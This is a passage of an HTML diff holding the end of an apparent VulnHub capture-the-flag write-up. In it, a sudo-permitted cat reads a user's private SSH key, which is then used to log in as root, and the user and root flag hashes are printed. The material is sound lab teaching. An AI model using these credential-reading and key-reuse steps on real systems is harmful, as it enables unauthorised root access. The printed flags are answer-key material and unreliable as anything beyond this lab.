+    <p class="rc-p">We use the allowed cat command to read the key:</p>
+
+    <div class="rc-code">
+      <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-sudo-cat">copy</button></div>
+      <pre><code id="code-sudo-cat">sudo cat /home/chaz/id_rsa</code></pre>
+    </div>
+
+    <figure class="rc-media" id="media-31">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-36.png" alt="RSA private key dumped, part 1" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-31.png</small></div>
+      </div>
+      <figcaption class="rc-caption">viewing root's private ssh key</figcaption>
+    </figure>
+
+    <figure class="rc-media" id="media-32">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-37.png" alt="RSA private key dumped, part 2" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-32.png</small></div>
+      </div>
+      <figcaption class="rc-caption">dumping root's private ssh key to a file</figcaption>
+    </figure>
+
+    <h3 class="rc-h3" id="root-access">Root Access</h3>
+
+    <p class="rc-p">We save the key locally, set correct permissions, and SSH into the machine as root.</p>
+
+    <div class="rc-code">
+      <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-ssh-root">copy</button></div>
+      <pre><code id="code-ssh-root">chmod 600 id_rsa
+ssh -i id_rsa root@192.168.56.146</code></pre>
+    </div>
+    
+    <figure class="rc-media" id="media-32">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-38.png" alt="RSA private key dumped, part 2" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-32.png</small></div>
+      </div>
+      <figcaption class="rc-caption">setting the correct permissions for the private key</figcaption>
+    </figure>
+
+    <p>Authenticating as the root user via SSH:</p>
+    <figure class="rc-media" id="media-32">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-39.png" alt="RSA private key dumped, part 2" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-32.png</small></div>
+      </div>
+      <figcaption class="rc-caption">root access via ssh private key</figcaption>
+    </figure>
+
+    <h2 class="rc-h2" id="flags"><span class="h2-icon">&#127937;</span>Flags</h2>
+
+    <p class="rc-p">We capture the final flags:</p>
+
+    <div class="rc-code">
+      <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-user-flag">copy</button></div>
+      <pre><code id="code-user-flag">cat /home/chaz/user.txt
+# d151c8ace0dbdd0ef23a3e3200f696f1</code></pre>
+    </div>
+
+    <figure class="rc-media" id="media-34">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-40.png" alt="user flag captured" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-34.png</small></div>
+      </div>
+      <figcaption class="rc-caption">user flag</figcaption>
+    </figure>
+
+    <div class="rc-code">
+      <div class="rc-code-head"><span>bash</span><button class="rc-copy" data-target="code-root-flag">copy</button></div>
+      <pre><code id="code-root-flag">cat /root/root.txt
+# a3cbb8984cf5f19086595c6a2f569786</code></pre>
+    </div>
+
+    <figure class="rc-media" id="media-35">
+      <div class="rc-media-frame">
+        <img src="static/assets/anaximandre/screenshot-41.png" alt="root flag captured" onerror="mediaMissing(this)">
+        <div class="rc-media-fallback"><strong>Image not found</strong><small>expected at: static/assets/anaximandre/screenshot-35.png</small></div>
+      </div>
+      <figcaption class="rc-caption">root flag</figcaption>
+    </figure>
+    <p>We've successfully captured both the user and root flags.</p>
+    <p>Rooted. 🏁</p>
+  </article>
+</div>
+
+<footer>
+  <div class="footer-inner">
+    <span>&copy; <span id="year"></span> 0xWriteups — built for GitHub Pages, no server required.</span>
+    <div class="footer-links">
+      <a href="https://github.com/">GitHub</a>
+      <a href="https://tryhackme.com/">TryHackMe</a>
+      <a href="https://www.vulnhub.com/">VulnHub</a>
+    </div>
+  </div>
+</footer>
+
+<script src="static/js/anaximandre.js"></script>
+</body>
+</html>
